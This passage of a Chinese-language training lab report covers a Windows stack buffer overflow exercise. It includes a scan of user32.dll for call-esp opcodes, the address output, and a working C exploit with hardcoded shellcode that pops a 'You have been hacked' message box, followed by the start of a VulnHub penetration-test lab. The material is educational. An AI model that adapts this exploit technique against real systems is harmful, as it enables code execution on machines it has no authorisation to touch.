getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码在 <code>user32.dll</code> 中搜索特定的机器码（<code>0xFF</code> 和 <code>0xD4</code>），并打印出找到的每个地址。请记住，直接访问系统库的内存可能导致不稳定的行为，因此请小心使用。此外，这段代码可能需要在具有管理员权限的环境中运行，以获取对系统库的访问权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">OPCODE found at 0x75940FBF</span><br><span class="line">OPCODE found at 0x75940FC3</span><br><span class="line">OPCODE found at 0x75940FC7</span><br><span class="line">OPCODE found at 0x75941013</span><br><span class="line">OPCODE found at 0x759410EF</span><br><span class="line">OPCODE found at 0x7594117B</span><br><span class="line">OPCODE found at 0x7594127F</span><br><span class="line">OPCODE found at 0x75941383</span><br><span class="line">OPCODE found at 0x75941CA7</span><br><span class="line">OPCODE found at 0x75941DA7</span><br><span class="line">OPCODE found at 0x75941E1B</span><br><span class="line">OPCODE found at 0x75941EA7</span><br><span class="line">OPCODE found at 0x75941F1B</span><br><span class="line">OPCODE found at 0x75941F77</span><br><span class="line">OPCODE found at 0x75941FA7</span><br><span class="line">OPCODE found at 0x759420A7</span><br><span class="line">OPCODE found at 0x75942183</span><br><span class="line">OPCODE found at 0x759421A7</span><br><span class="line">OPCODE found at 0x759422A7</span><br><span class="line">OPCODE found at 0x759423A7</span><br><span class="line">OPCODE found at 0x759424A7</span><br><span class="line">OPCODE found at 0x759425A7</span><br><span class="line">OPCODE found at 0x759426A7</span><br><span class="line">OPCODE found at 0x75942783</span><br><span class="line">OPCODE found at 0x759427A7</span><br><span class="line">OPCODE found at 0x759428A7</span><br><span class="line">OPCODE found at 0x759429A7</span><br><span class="line">OPCODE found at 0x75942AA7</span><br><span class="line">OPCODE found at 0x75942BA7</span><br><span class="line">OPCODE found at 0x75942CA7</span><br><span class="line">OPCODE found at 0x75942DA7</span><br><span class="line">OPCODE found at 0x75942EA7</span><br><span class="line">OPCODE found at 0x75942FA7</span><br><span class="line">OPCODE found at 0x759430A7</span><br><span class="line">OPCODE found at 0x759431A7</span><br><span class="line">OPCODE found at 0x759432A7</span><br><span class="line">OPCODE found at 0x759433A7</span><br><span class="line">OPCODE found at 0x759434A7</span><br><span class="line">OPCODE found at 0x759435A7</span><br><span class="line">OPCODE found at 0x759436A7</span><br><span class="line">OPCODE found at 0x759437AB</span><br><span class="line">OPCODE found at 0x7594CBA7</span><br><span class="line">OPCODE found at 0x7594CBCF</span><br><span class="line">OPCODE found at 0x7594D67B</span><br><span class="line">OPCODE found at 0x7594F437</span><br><span class="line">OPCODE found at 0x7594FA27</span><br><span class="line">OPCODE found at 0x75952433</span><br><span class="line">OPCODE found at 0x75958ADB</span><br><span class="line">OPCODE found at 0x759592F7</span><br><span class="line">OPCODE found at 0x75959F07</span><br><span class="line">OPCODE found at 0x7595A10B</span><br><span class="line">OPCODE found at 0x7595A417</span><br><span class="line">OPCODE found at 0x7595ADA7</span><br><span class="line">OPCODE found at 0x7595AEB3</span><br><span class="line">OPCODE found at 0x7595AFB7</span><br><span class="line">OPCODE found at 0x7595B0BF</span><br><span class="line">OPCODE found at 0x7595B1C7</span><br><span class="line">OPCODE found at 0x7595B2CB</span><br><span class="line">OPCODE found at 0x7595B3D3</span><br><span class="line">OPCODE found at 0x7595B6DF</span><br><span class="line">OPCODE found at 0x7595B9F3</span><br><span class="line">OPCODE found at 0x7595BAFF</span><br><span class="line">OPCODE found at 0x7595BC07</span><br><span class="line">OPCODE found at 0x7595BE13</span><br><span class="line">OPCODE found at 0x7595BF1F</span><br><span class="line">OPCODE found at 0x7595CB1F</span><br><span class="line">OPCODE found at 0x7595D70F</span><br><span class="line">OPCODE found at 0x7595D7C7</span><br><span class="line">OPCODE found at 0x7595DDDF</span><br><span class="line">OPCODE found at 0x7595DF0B</span><br><span class="line">OPCODE found at 0x7595DFD3</span><br><span class="line">OPCODE found at 0x7595E09B</span><br><span class="line">OPCODE found at 0x7595E163</span><br><span class="line">OPCODE found at 0x7595E543</span><br><span class="line">OPCODE found at 0x7595E607</span><br><span class="line">OPCODE found at 0x7595E6CF</span><br><span class="line">OPCODE found at 0x7595E797</span><br><span class="line">OPCODE found at 0x7595E857</span><br><span class="line">OPCODE found at 0x7595E913</span><br><span class="line">OPCODE found at 0x7595F097</span><br><span class="line">OPCODE found at 0x7595F0CB</span><br><span class="line">OPCODE found at 0x7595F39F</span><br><span class="line">OPCODE found at 0x7595F6EF</span><br><span class="line">OPCODE found at 0x7595F773</span><br><span class="line">OPCODE found at 0x7595F7FB</span><br><span class="line">OPCODE found at 0x7595FB23</span><br><span class="line">OPCODE found at 0x7595FBA7</span><br><span class="line">OPCODE found at 0x7596008F</span><br><span class="line">OPCODE found at 0x759600D7</span><br><span class="line">OPCODE found at 0x75960163</span><br><span class="line">OPCODE found at 0x75964AE3</span><br><span class="line">OPCODE found at 0x759677BB</span><br><span class="line">OPCODE found at 0x75968B27</span><br><span class="line">OPCODE found at 0x75969827</span><br><span class="line">OPCODE found at 0x759698EB</span><br><span class="line">OPCODE found at 0x75969AC7</span><br><span class="line">OPCODE found at 0x7596B0D3</span><br><span class="line">OPCODE found at 0x7596B7B3</span><br><span class="line">OPCODE found at 0x75970AFB</span><br><span class="line">OPCODE found at 0x759733D3</span><br><span class="line">OPCODE found at 0x759734D3</span><br><span class="line">OPCODE found at 0x759734DB</span><br><span class="line">OPCODE found at 0x759734DF</span><br><span class="line">OPCODE found at 0x759734E3</span><br><span class="line">OPCODE found at 0x759735E7</span><br><span class="line">OPCODE found at 0x759735F7</span><br><span class="line">OPCODE found at 0x759735FB</span><br><span class="line">OPCODE found at 0x75973703</span><br><span class="line">OPCODE found at 0x75973707</span><br><span class="line">OPCODE found at 0x7597370B</span><br><span class="line">OPCODE found at 0x75973917</span><br><span class="line">OPCODE found at 0x75973C27</span><br><span class="line">OPCODE found at 0x75973CEF</span><br><span class="line">OPCODE found at 0x75973D37</span><br><span class="line">OPCODE found at 0x75973E3B</span><br><span class="line">OPCODE found at 0x7597410B</span><br><span class="line">OPCODE found at 0x75974B3F</span><br><span class="line">OPCODE found at 0x759754F7</span><br><span class="line">OPCODE found at 0x75975E77</span><br><span class="line">OPCODE found at 0x75975E7B</span><br><span class="line">OPCODE found at 0x75975E7F</span><br><span class="line">OPCODE found at 0x75975E83</span><br><span class="line">OPCODE found at 0x75975E87</span><br><span class="line">OPCODE found at 0x75975E8B</span><br><span class="line">OPCODE found at 0x75975E8F</span><br><span class="line">OPCODE found at 0x75975E93</span><br><span class="line">OPCODE found at 0x75975F2F</span><br><span class="line">OPCODE found at 0x75975F5F</span><br><span class="line">OPCODE found at 0x75975FEF</span><br><span class="line">OPCODE found at 0x75976283</span><br><span class="line">OPCODE found at 0x75976407</span><br><span class="line">OPCODE found at 0x759764BF</span><br><span class="line">OPCODE found at 0x759764CB</span><br><span class="line">OPCODE found at 0x7597658F</span><br><span class="line">OPCODE found at 0x7597664F</span><br><span class="line">OPCODE found at 0x75976877</span><br><span class="line">OPCODE found at 0x759770EB</span><br><span class="line">OPCODE found at 0x75978073</span><br><span class="line">OPCODE found at 0x75978077</span><br><span class="line">OPCODE found at 0x75978153</span><br><span class="line">OPCODE found at 0x7597CDBF</span><br><span class="line">OPCODE found at 0x7597CDC3</span><br><span class="line">OPCODE found at 0x7597CDC7</span><br><span class="line">OPCODE found at 0x7597CE13</span><br><span class="line">OPCODE found at 0x7597CEEF</span><br><span class="line">OPCODE found at 0x7597CF7B</span><br><span class="line">OPCODE found at 0x7597D07F</span><br><span class="line">OPCODE found at 0x7597D183</span><br><span class="line">OPCODE found at 0x7597DAA7</span><br><span class="line">OPCODE found at 0x7597DBA7</span><br><span class="line">OPCODE found at 0x7597DC1B</span><br><span class="line">OPCODE found at 0x7597DCA7</span><br><span class="line">OPCODE found at 0x7597DD1B</span><br><span class="line">OPCODE found at 0x7597DD77</span><br><span class="line">OPCODE found at 0x7597DDA7</span><br><span class="line">OPCODE found at 0x7597DEA7</span><br><span class="line">OPCODE found at 0x7597DF83</span><br><span class="line">OPCODE found at 0x7597DFA7</span><br><span class="line">OPCODE found at 0x7597E0A7</span><br><span class="line">OPCODE found at 0x7597E1A7</span><br><span class="line">OPCODE found at 0x7597E2A7</span><br><span class="line">OPCODE found at 0x7597E3A7</span><br><span class="line">OPCODE found at 0x7597E4A7</span><br><span class="line">OPCODE found at 0x7597E583</span><br><span class="line">OPCODE found at 0x7597E5A7</span><br><span class="line">OPCODE found at 0x7597E6A7</span><br><span class="line">OPCODE found at 0x7597E7A7</span><br><span class="line">OPCODE found at 0x7597E8A7</span><br><span class="line">OPCODE found at 0x7597E9A7</span><br><span class="line">OPCODE found at 0x7597EAA7</span><br><span class="line">OPCODE found at 0x7597EBA7</span><br><span class="line">OPCODE found at 0x7597ECA7</span><br><span class="line">OPCODE found at 0x7597EDA7</span><br><span class="line">OPCODE found at 0x7597EEA7</span><br><span class="line">OPCODE found at 0x7597EFA7</span><br><span class="line">OPCODE found at 0x7597F0A7</span><br><span class="line">OPCODE found at 0x7597F1A7</span><br><span class="line">OPCODE found at 0x7597F2A7</span><br><span class="line">OPCODE found at 0x7597F3A7</span><br><span class="line">OPCODE found at 0x7597F4A7</span><br><span class="line">OPCODE found at 0x7597F5AB</span><br><span class="line">OPCODE found at 0x7599109B</span><br><span class="line">OPCODE found at 0x7599109F</span><br><span class="line">OPCODE found at 0x759929EB</span><br><span class="line">OPCODE found at 0x75993183</span><br><span class="line">OPCODE found at 0x75993CF7</span><br><span class="line">OPCODE found at 0x75993D0F</span><br><span class="line">OPCODE found at 0x7599481B</span><br><span class="line">OPCODE found at 0x75994BFB</span><br><span class="line">OPCODE found at 0x75994C9F</span><br><span class="line">OPCODE found at 0x7599595B</span><br><span class="line">OPCODE found at 0x7599595F</span><br><span class="line">OPCODE found at 0x75995E8C</span><br><span class="line">OPCODE found at 0x75995E9C</span><br><span class="line">OPCODE found at 0x75995F6C</span><br><span class="line">OPCODE found at 0x7599E18F</span><br><span class="line">OPCODE found at 0x7599FA1B</span><br><span class="line">OPCODE found at 0x759A0FCB</span><br><span class="line">OPCODE found at 0x759A261F</span><br><span class="line">OPCODE found at 0x759A2627</span><br><span class="line">OPCODE found at 0x759A270F</span><br><span class="line">OPCODE found at 0x759A4633</span><br><span class="line">OPCODE found at 0x759A4637</span><br><span class="line">OPCODE found at 0x759B2CF7</span><br><span class="line">OPCODE found at 0x759B38EF</span><br><span class="line">OPCODE found at 0x759B4CE7</span><br><span class="line">OPCODE found at 0x759B512B</span><br><span class="line">OPCODE found at 0x759BF74F</span><br><span class="line">OPCODE found at 0x759C0FDB</span><br><span class="line">OPCODE found at 0x759C258B</span><br><span class="line">OPCODE found at 0x759C3BDF</span><br><span class="line">OPCODE found at 0x759C3BE7</span><br><span class="line">OPCODE found at 0x759C3CCF</span><br><span class="line">OPCODE found at 0x759C5BF3</span><br><span class="line">OPCODE found at 0x759C5BF7</span><br><span class="line">OPCODE found at 0x759C797B</span><br><span class="line">OPCODE found at 0x759C98EB</span><br><span class="line">OPCODE found at 0x759CA1CF</span><br><span class="line">OPCODE found at 0x759E5AA9</span><br><span class="line">OPCODE found at 0x759E66DF</span><br><span class="line">OPCODE found at 0x759E6AE3</span><br><span class="line">OPCODE found at 0x759E6B6F</span><br><span class="line">OPCODE found at 0x759E6B73</span><br><span class="line">OPCODE found at 0x759EEBA3</span><br><span class="line">OPCODE found at 0x759F0D2F</span><br><span class="line">OPCODE found at 0x759F1C91</span><br><span class="line">OPCODE found at 0x759F34B7</span><br><span class="line">OPCODE found at 0x759F457D</span><br><span class="line">OPCODE found at 0x759F8929</span><br><span class="line">OPCODE found at 0x759F9253</span><br><span class="line">OPCODE found at 0x759F955F</span><br><span class="line">OPCODE found at 0x759F9963</span><br><span class="line">OPCODE found at 0x759F99EF</span><br><span class="line">OPCODE found at 0x759F99F3</span><br><span class="line">OPCODE found at 0x75A01A23</span><br><span class="line">OPCODE found at 0x75A03BAF</span><br><span class="line">OPCODE found at 0x75A06337</span><br><span class="line">OPCODE found at 0x75A073FD</span><br><span class="line">OPCODE found at 0x75A0D5BD</span><br><span class="line">OPCODE found at 0x75A105FB</span><br><span class="line">OPCODE found at 0x75A12293</span><br><span class="line">OPCODE found at 0x75A17D19</span><br><span class="line">OPCODE found at 0x75A18A67</span><br><span class="line">OPCODE found at 0x75A1AEEB</span><br><span class="line">OPCODE found at 0x75A1BF31</span><br><span class="line">OPCODE found at 0x75A1DBA1</span><br></pre></td></tr></table></figure>
<p><code>strcy.cpp</code>程序实现</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 恶意代码的shellcode，使用十六进制表示</span></span><br><span class="line"><span class="type">char</span> name[] = <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x0F\x94\x75&quot;</span><span class="comment">//这里调用</span></span><br><span class="line"><span class="string">&quot;\x83\xEC\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x69\x6E\x67\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x57\x61\x72\x6E&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xC4&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x21\x20\x20\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x63\x6B\x65\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x6E\x20\x68\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x20\x62\x65\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x68\x61\x76\x65&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x59\x6F\x75\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xCC&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\x10\xa1\x8f\x75&quot;</span><span class="comment">//\xB8不能改，小端存储</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xB8\xd0\x74\x41\x76&quot;</span> <span class="comment">//\xB8不能改，小端存储</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> st[<span class="number">11</span>];</span><br><span class="line">		<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="comment">// 将shellcode复制到更小的缓冲区，这可能导致缓冲区溢出</span></span><br><span class="line">	<span class="built_in">strcpy</span>(st, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,st);</span><br><span class="line">	<span class="comment">// 打印复制到缓冲区的内容</span></span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  以下是注释掉的代码，看起来像是用于动态加载库的代码片段，可能用于进一步的溢出利用</span></span><br><span class="line"><span class="comment">  &quot;\x8D\x4C\x24\x04&quot;</span></span><br><span class="line"><span class="comment">  &quot;\x83\xE4\xF0&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xFF\x71\xFC&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x55&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x89\xE5&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x51&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x83\xEC\x14&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xE8\x8A\x09\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x0C\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x08\x00\x40\x40\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x04\x08\x40\x40\x00&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xA1\xE0\x61\x40\x00&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xFF\xD0&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x83\xEC\x10&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xA1\x24\x61\x40\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xFF\xD0&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141932525.png" class="" title="image-20240131141932525">
<h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><h4 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h4><ul>
<li><strong>理论与实践结合</strong>：通过实验操作，加深了对缓冲区溢出攻击原理的理解。</li>
<li><strong>问题解决能力</strong>：在实验过程中遇到问题，如编译模式对栈空间的影响，学会了如何查找和解决问题。</li>
<li><strong>安全意识提升</strong>：认识到了安全编程的重要性，以及在软件开发中预防缓冲区溢出的必要性。</li>
</ul>
<h4 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a>实验方法</h4><ol>
<li>精确定位返回地址的位置：通过调试工具（如OllyDbg）观察程序执行过程中堆栈的变化，找到返回地址。</li>
<li>寻找一个合适的地址用于覆盖原始地址：使用jmp esp或call esp等指令，跳转到shellcode执行。</li>
<li>编写shellcode到相应的缓冲区中：编写能够执行特定功能的shellcode，并将其放入程序的缓冲区。</li>
</ol>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><ul>
<li>成功实现了缓冲区溢出，程序执行了预期的MessageBox弹窗警告。</li>
<li>通过IDA Pro分析，确认了shellcode执行后程序的控制流程。</li>
</ul>
<h4 id="分析与讨论"><a href="#分析与讨论" class="headerlink" title="分析与讨论"></a>分析与讨论</h4><ul>
<li>实验结果符合预期，验证了缓冲区溢出攻击的可行性。</li>
<li>实验中遇到的问题，如编译模式对栈空间的影响，以及动态链接库的加载，都对攻击成功与否有重要影响。</li>
</ul>
<h4 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h4><ul>
<li>缓冲区溢出攻击是一种有效的软件漏洞利用技术，需要开发者在编写程序时注意边界检查和内存管理。</li>
<li>实验加深了对缓冲区溢出攻击原理的理解，提高了安全编程意识。</li>
</ul>
<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><ul>
<li><strong>实验目的达成</strong>：成功完成了缓冲区溢出攻击的模拟，实现了预期的功能。</li>
<li><strong>实验过程记录</strong>：详细记录了实验步骤和遇到的问题，为后续分析提供了依据。</li>
<li><strong>实验结果分析</strong>：对实验结果进行了分析，与理论预期进行了比较，得出了有意义的结论。</li>
<li><strong>实验意义</strong>：实验不仅提升了技术能力，更重要的是提高了安全意识，对于未来的软件开发和安全防护工作具有重要意义。</li>
</ul>
<h2 id="实训2-项目名称：-Bob渗透测试"><a href="#实训2-项目名称：-Bob渗透测试" class="headerlink" title="实训2 项目名称：   Bob渗透测试"></a>实训2 项目名称：   Bob渗透测试</h2><h4 id="一、环境及工具-1"><a href="#一、环境及工具-1" class="headerlink" title="一、环境及工具"></a>一、环境及工具</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><ul>
<li><strong>操作系统</strong>：Kali Linux</li>
<li><strong>测试网络</strong>：安全隔离的内部网络，确保实验不影响外部网络</li>
<li><p><strong>目标主机</strong>：模拟的受害者计算机（称为Bob）</p>
<ul>
<li>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a><br>靶机名称：bob-101，下载ova格式文件，直接在虚拟机打开，网络适配器中设置为NAT模式网卡即可。</li>
</ul>
</li>
<li><p><strong>前置知识</strong>：网络安全基础，Linux操作系统，渗透测试方法</p>
</li>
<li><strong>必要的课程/说明</strong>：网络安全概念，渗透测试原理</li>
<li><strong>推荐文章链接</strong>：<ol>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">Nmap使用详解</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/124246499">Nikto工具使用教程</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44912169/article/details/105655195">Dirb使用教程</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6148306.html">NC工具使用方法</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">https://zhuanlan.zhihu.com/p/220143826</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/z2560088/article/details/120397193">https://blog.csdn.net/z2560088/article/details/120397193</a></li>
</ol>
</li>
</ul>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ol>
<li><strong>Nmap</strong>：用于主机发现和端口扫描</li>
<li><strong>Nikto</strong>：用于网站漏洞扫描</li>
<li><strong>Dirb</strong>：用于敏感文件和目录的探索</li>
<li><strong>Burp Suite</strong>：用于Web应用的安全测试</li>
<li><strong>Netcat（NC）</strong>：用于网络操作，如端口监听和Shell连接</li>
</ol>
